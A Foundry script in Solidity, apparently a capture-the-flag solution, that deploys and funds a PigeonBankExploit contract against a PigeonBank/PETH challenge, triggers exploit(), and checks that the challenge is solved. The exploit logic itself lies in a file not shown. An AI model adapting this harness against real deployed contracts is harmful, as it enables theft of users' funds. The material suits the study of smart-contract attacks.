// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

import "../src/PigeonBank.sol";
import "../src/Setup.sol";
import "../src/PETH.sol";
import "../src/PigeonBankExploit.sol";

contract PigeonBankScript is Script {
    Setup setupContract;
    PigeonBankExploit exploitContract;
    PigeonBank pigeonBankContract;
    PETH pethContract;

    function setUp() public {
        setupContract = Setup(0x7f4E9d14178be57080296703569693202D3317b2);
        pigeonBankContract = setupContract.pigeonBank();
        pethContract = setupContract.peth();
    }

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        address attacker = vm.addr(deployerPrivateKey);

        exploitContract = new PigeonBankExploit(address(pethContract), address(pigeonBankContract), payable(attacker));

        // Transfer ETH to exploit contract
        (bool success,) = address(exploitContract).call{value: 9 ether}("");
        require(success, "Failed to transfer ETH to exploit contract");

        // Call exploit function
        exploitContract.exploit();

        // Check if exploit was successful
        require(setupContract.isSolved(), "Failed to exploit");

        vm.stopBroadcast();
    }

    receive() external payable {}
}
